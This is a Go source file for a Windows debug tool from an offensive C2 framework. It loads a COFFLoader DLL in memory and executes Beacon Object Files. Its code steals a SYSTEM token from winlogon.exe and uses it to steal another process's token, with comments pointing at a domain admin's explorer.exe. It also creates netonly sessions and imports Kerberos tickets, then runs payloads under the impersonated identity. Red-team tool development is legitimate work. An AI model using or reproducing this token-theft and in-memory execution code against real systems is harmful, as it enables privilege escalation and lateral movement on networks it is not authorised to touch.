//go:build windows

// bofrunner is a standalone debug tool that loads the COFFLoader DLL in
// memory (via memmod, the same way the agent does) and uses it to execute a
// Beacon Object File. The COFFLoader's DEBUG_PRINT tracing goes straight to
// stdout, so build the DLL with debug enabled:
//
//	make -C modules/coffloader dll DEBUG=1
//
// Usage:
//
//	bofrunner -bof /path/to/bof.o [-config /path/to/module/config.json] \
//	          [-module <name>] [--<param> value ...] \
//	          [-dll /path/to/COFFLoader.x64.dll] [-entry go] \
//	          [-args "z:arg1,i:1234"] [-steal-pid <pid>]
//
// When -config (or a config.json found next to the BOF) describes the module
// the BOF belongs to, its declared parameters become --<param> flags whose
// values are typed and packed exactly as the agent packs them, e.g.
// `--params '/luid:3ea8' /server:krbtgt`. The -args form remains for ad-hoc
// BOFs whose manifest is unavailable.
package main

import (
	"flag"
	"fmt"
	"os"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"

	"github.com/jm33-m0/emp3r0r/core/internal/def"
	"github.com/jm33-m0/emp3r0r/core/lib/coffloader"
	"github.com/jm33-m0/emp3r0r/core/lib/modconfig"
	"github.com/jm33-m0/emp3r0r/core/lib/priv"
	"github.com/jm33-m0/emp3r0r/core/lib/syscall"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
	"golang.org/x/sys/windows"
)

func main() {
	os.Exit(run())
}

func run() int {
	// Module parameter flags cannot be declared until the module manifest is
	// known, because the standard flag package rejects unknown flags. Peek at
	// the bootstrap flags first, load the config, then register one flag per
	// declared parameter so operators pass BOF args exactly as they do on the
	// C2 (e.g. --params '/luid:3ea8').
	bootstrap := os.Args[1:]
	configPath, configSet := scanFlag(bootstrap, "config")
	moduleName, _ := scanFlag(bootstrap, "module")
	bofArg, _ := scanFlag(bootstrap, "bof")
	argsArg, _ := scanFlag(bootstrap, "args")

	var moduleConfig *def.ModuleConfig
	if configSet {
		configs, err := modconfig.ReadConfigs(configPath)
		if err != nil {
			fmt.Fprintf(os.Stderr, "[!] read config: %v\n", err)
			return 1
		}
		moduleConfig, err = modconfig.SelectModule(configs, moduleName, filepath.Base(bofArg))
		if err != nil {
			fmt.Fprintf(os.Stderr, "[!] select module: %v\n", err)
			return 1
		}
	} else if argsArg == "" && bofArg != "" {
		// No typed -args: borrow the manifest shipped next to the BOF when
		// one exists, so --<param> flags work without an explicit -config.
		if path, err := modconfig.FindConfigFile(bofArg); err == nil {
			if configs, rerr := modconfig.ReadConfigs(path); rerr == nil {
				if selected, serr := modconfig.SelectModule(configs, moduleName, filepath.Base(bofArg)); serr == nil {
					configPath, moduleConfig = path, selected
				}
			}
		}
	}

	fs := flag.NewFlagSet("bofrunner", flag.ContinueOnError)
	dllPath := fs.String("dll", "", "path to COFFLoader DLL (auto-detected when empty)")
	bofPath := fs.String("bof", bofArg, "path to BOF object file (.o)")
	entry := fs.String("entry", "go", "BOF entry function name")
	argsStr := fs.String("args", argsArg, `comma-separated BOF args: z:str, Z:wide, i:int, s:short, b:base64/hex`)
	fs.String("config", configPath, "module config.json used to type --<param> arguments")
	fs.String("module", moduleName, "module name to select from -config")
	makeToken := fs.String("make-token", "", "create a netonly make_token session for this user and run the BOF under it")
	stealPid := fs.Uint("steal-pid", 0, "steal the token of this local PID (e.g. explorer.exe of a logged-in user) and run the BOF under it; alternative to -make-token")
	domain := fs.String("domain", ".", "domain for -make-token (default: local machine)")
	password := fs.String("password", "dummy", "password for -make-token (never validated, netonly)")
	importTkt := fs.String("import-ticket", "", "path to a .kirbi (or base64 string) to import into the session before running")

	// Register the selected module's parameters as flags. A parameter whose
	// name collides with a built-in flag is skipped so the tool flag wins.
	if moduleConfig != nil {
		for name, opt := range moduleConfig.Options {
			if fs.Lookup(name) != nil {
				continue
			}
			fs.String(name, opt.Val, opt.Desc)
		}
	}

	if err := fs.Parse(os.Args[1:]); err != nil {
		return 2
	}

	if *bofPath == "" {
		fmt.Fprintln(os.Stderr, "usage: bofrunner -bof <bof.o> [-config <config.json>] [-module <name>] [--<param> value ...] [-dll <COFFLoader.dll>] [-entry go] [-args z:str,i:int] [-make-token user] [-domain d] [-password p] [-import-ticket ticket.kirbi] [-steal-pid PID]")
		fs.PrintDefaults()
		return 2
	}

	if *makeToken != "" && *stealPid != 0 {
		fmt.Fprintln(os.Stderr, "[!] -make-token and -steal-pid are mutually exclusive")
		return 2
	}

	dllFile, err := findDLL(*dllPath)
	if err != nil {
		fmt.Fprintf(os.Stderr, "[!] %v\n", err)
		return 1
	}
	dllData, err := os.ReadFile(dllFile)
	if err != nil {
		fmt.Fprintf(os.Stderr, "[!] read %s: %v\n", dllFile, err)
		return 1
	}

	payload, err := os.ReadFile(*bofPath)
	if err != nil {
		fmt.Fprintf(os.Stderr, "[!] read %s: %v\n", *bofPath, err)
		return 1
	}

	// Resolve BOF arguments. With a module config every declared parameter is
	// packed in order (empty ones as zero) using the same rules the agent
	// applies; -args stays as the escape hatch for ad-hoc BOFs without a
	// manifest.
	var args []coffloader.CoffArg
	entryName := *entry
	if moduleConfig != nil {
		if strings.TrimSpace(*argsStr) != "" {
			fmt.Fprintln(os.Stderr, "[!] -args and module parameters are mutually exclusive; drop one")
			return 2
		}
		flags := make(map[string]string, len(moduleConfig.Options))
		for name, opt := range moduleConfig.Options {
			if f := fs.Lookup(name); f != nil {
				flags[name] = f.Value.String()
			} else {
				flags[name] = opt.Val
			}
		}
		args, err = modconfig.ResolveCoffArgs(moduleConfig, flags)
		if err != nil {
			fmt.Fprintf(os.Stderr, "[!] resolve %s args: %v\n", moduleConfig.Name, err)
			return 1
		}
		// Prefer the manifest's entry point unless -entry was given explicitly.
		if moduleConfig.Invocation.Coff != nil && moduleConfig.Invocation.Coff.Export != "" {
			entrySet := false
			fs.Visit(func(f *flag.Flag) {
				if f.Name == "entry" {
					entrySet = true
				}
			})
			if !entrySet {
				entryName = moduleConfig.Invocation.Coff.Export
			}
		}
	} else {
		args, err = parseArgs(*argsStr)
		if err != nil {
			fmt.Fprintf(os.Stderr, "[!] parse args: %v\n", err)
			return 1
		}
	}

	fmt.Fprintf(os.Stderr, "[*] COFFLoader DLL: %s (%d bytes)\n", dllFile, len(dllData))
	fmt.Fprintf(os.Stderr, "[*] BOF: %s (module=%s, entry=%s, %d args)\n", *bofPath, moduleLabel(moduleConfig), entryName, len(args))

	// Optionally create a netonly make_token session (PTT container) and run
	// the BOF under its impersonation token, exactly like the agent does with
	// `some_bof --token <session>`.
	var token uintptr
	if *makeToken != "" {
		if _, err := syscall.GetRuntimeSyscallTable(); err != nil {
			fmt.Fprintf(os.Stderr, "[!] syscall table: %v\n", err)
			return 1
		}
		session, err := priv.MakeToken(*makeToken, *domain, *password)
		if err != nil {
			fmt.Fprintf(os.Stderr, "[!] make_token: %v\n", err)
			return 1
		}
		defer windows.CloseHandle(windows.Handle(session.Token))
		name := priv.DefaultSessionName(session)
		priv.StoreSession(name, session)
		priv.RegisterSessionToken(session)
		token = session.Token

		fmt.Fprintf(os.Stderr, "[*] session %s: NetOnly=%v identity=%s luid=0x%08x\n",
			name, session.NetOnly, priv.GetTokenFriendlyName(windows.Handle(session.Token)), session.LogonID)

		if *importTkt != "" {
			b64 := *importTkt
			if fi, err := os.Stat(b64); err == nil && !fi.IsDir() {
				raw, rerr := os.ReadFile(b64)
				if rerr != nil {
					fmt.Fprintf(os.Stderr, "[!] read ticket: %v\n", rerr)
					return 1
				}
				b64 = string(raw)
			}
			if err := priv.ImportTicketBase64(session, b64); err != nil {
				fmt.Fprintf(os.Stderr, "[!] import_ticket: %v\n", err)
				return 1
			}
			fmt.Fprintf(os.Stderr, "[*] imported ticket into session %s (luid=0x%08x)\n", name, session.LogonID)
		}

		// Wire the same impersonation hooks the agent uses for BOFs.
		coffloader.PreExecHook = func(tok uintptr) {
			if err := priv.ImpersonateThread(windows.Handle(tok)); err != nil {
				fmt.Fprintf(os.Stderr, "[!] PreExecHook ImpersonateThread: %v\n", err)
			}
		}
		coffloader.PostExecHook = func() { priv.RevertThread() }
	}

	// -steal-pid mirrors the agent's steal_token flow: duplicate the primary
	// token of a local process (e.g. explorer.exe of a logged-in DA) and run
	// the BOF under its impersonation token — no ticket import needed when
	// the target logon session already has Kerberos tickets cached.
	//
	// Some tokens (e.g. another admin user's interactive session) deny
	// TOKEN_DUPLICATE even with SeDebugPrivilege; chaining the steal through
	// a SYSTEM process token (winlogon.exe) first works in every case.
	if *stealPid != 0 {
		if _, err := syscall.GetRuntimeSyscallTable(); err != nil {
			fmt.Fprintf(os.Stderr, "[!] syscall table: %v\n", err)
			return 1
		}
		sysPids := util.PidOf("winlogon.exe")
		if len(sysPids) == 0 {
			fmt.Fprintln(os.Stderr, "[!] winlogon.exe not found for SYSTEM escalation")
			return 1
		}
		sysTok, err := priv.StealToken(syscall.RuntimeSyscallTable, uint32(sysPids[0]))
		if err != nil {
			fmt.Fprintf(os.Stderr, "[!] steal SYSTEM token from winlogon (pid %d): %v\n", sysPids[0], err)
			return 1
		}
		defer windows.CloseHandle(sysTok)

		hToken, err := priv.StealToken(syscall.RuntimeSyscallTable, uint32(*stealPid), sysTok)
		if err != nil {
			fmt.Fprintf(os.Stderr, "[!] steal_token from PID %d (as SYSTEM): %v\n", *stealPid, err)
			return 1
		}
		defer windows.CloseHandle(hToken)
		token = uintptr(hToken)

		fmt.Fprintf(os.Stderr, "[*] stolen token from PID %d: %s\n", *stealPid, priv.GetTokenFriendlyName(hToken))

		coffloader.PreExecHook = func(tok uintptr) {
			if err := priv.ImpersonateThread(windows.Handle(tok)); err != nil {
				fmt.Fprintf(os.Stderr, "[!] PreExecHook ImpersonateThread: %v\n", err)
			}
		}
		coffloader.PostExecHook = func() { priv.RevertThread() }
	}

	fmt.Fprintf(os.Stderr, "[*] Loading COFFLoader DLL in-memory and executing BOF...\n\n")

	out, execErr := coffloader.RunWindowsCOFFViaDLL(dllData, payload, entryName, args, token)
	if out != "" {
		fmt.Print(out)
		if !strings.HasSuffix(out, "\n") {
			fmt.Println()
		}
	}
	if execErr != nil {
		fmt.Fprintf(os.Stderr, "\n[!] BOF execution failed: %v\n", execErr)
		return 1
	}

	fmt.Fprintln(os.Stderr, "\n[+] BOF execution finished")
	return 0
}

// findDLL resolves the COFFLoader DLL path, checking the user-supplied path
// first and then a set of conventional locations relative to the binary and
// the repository layout.
func findDLL(userPath string) (string, error) {
	if userPath != "" {
		if _, err := os.Stat(userPath); err != nil {
			return "", fmt.Errorf("COFFLoader DLL not found at %s: %v", userPath, err)
		}
		return userPath, nil
	}

	name := "COFFLoader.x64.dll"
	if runtime.GOARCH == "386" {
		name = "COFFLoader.x86.dll"
	}

	candidates := []string{
		name,
		filepath.Join("modules", "coffloader", name),
		filepath.Join("..", "modules", "coffloader", name),
		filepath.Join("..", "..", "modules", "coffloader", name),
		filepath.Join("..", "..", "..", "modules", "coffloader", name),
	}

	if exe, err := os.Executable(); err == nil {
		dir := filepath.Dir(exe)
		candidates = append([]string{
			filepath.Join(dir, name),
			filepath.Join(dir, "modules", "coffloader", name),
		}, candidates...)
	}

	for _, c := range candidates {
		if fi, err := os.Stat(c); err == nil && !fi.IsDir() {
			return c, nil
		}
	}

	return "", fmt.Errorf(
		"COFFLoader DLL not found (searched: %s); build it with `make -C modules/coffloader dll DEBUG=1` or pass -dll",
		strings.Join(candidates, ", "))
}

// scanFlag extracts the value of the named flag from args. It is used to peek
// at the bootstrap flags before the module manifest is loaded, at which point
// the standard flag.FlagSet does not yet know the module's --<param> flags.
// It understands -name value, --name value, -name=value and --name=value and
// stops at a bare "--".
func scanFlag(args []string, name string) (string, bool) {
	for i := 0; i < len(args); i++ {
		arg := args[i]
		if arg == "--" {
			break
		}
		if !strings.HasPrefix(arg, "-") {
			continue
		}
		key := strings.TrimLeft(arg, "-")
		if key == "" {
			continue
		}
		if k, v, ok := strings.Cut(key, "="); ok {
			if k == name {
				return v, true
			}
			continue
		}
		if key == name && i+1 < len(args) {
			return args[i+1], true
		}
	}
	return "", false
}

// moduleLabel renders a module config for human-readable diagnostics.
func moduleLabel(config *def.ModuleConfig) string {
	if config == nil {
		return "(none)"
	}
	return config.Name
}

// parseArgs parses the -args flag into COFFLoader wire args. Supported tokens:
// z (UTF-8 string), Z (UTF-16 wide string), i (32-bit int), s (16-bit short),
// b (binary: base64 or hex).
func parseArgs(s string) ([]coffloader.CoffArg, error) {
	if strings.TrimSpace(s) == "" {
		return nil, nil
	}

	parts := strings.Split(s, ",")
	args := make([]coffloader.CoffArg, 0, len(parts))
	for _, part := range parts {
		part = strings.TrimSpace(part)
		if part == "" {
			continue
		}
		typ, val, ok := strings.Cut(part, ":")
		if !ok {
			return nil, fmt.Errorf("invalid arg %q (want type:value)", part)
		}
		typ = strings.TrimSpace(typ)
		val = strings.TrimSpace(val)

		switch typ {
		case "z", "Z":
			args = append(args, coffloader.CoffArg{WireType: typ, Value: val})
		case "i", "s":
			n, err := strconv.ParseInt(val, 10, 64)
			if err != nil {
				return nil, fmt.Errorf("arg %q: %w", part, err)
			}
			args = append(args, coffloader.CoffArg{WireType: typ, Value: n})
		case "b":
			args = append(args, coffloader.CoffArg{WireType: "b", Value: val})
		default:
			return nil, fmt.Errorf("unsupported arg type %q in %q", typ, part)
		}
	}
	return args, nil
}
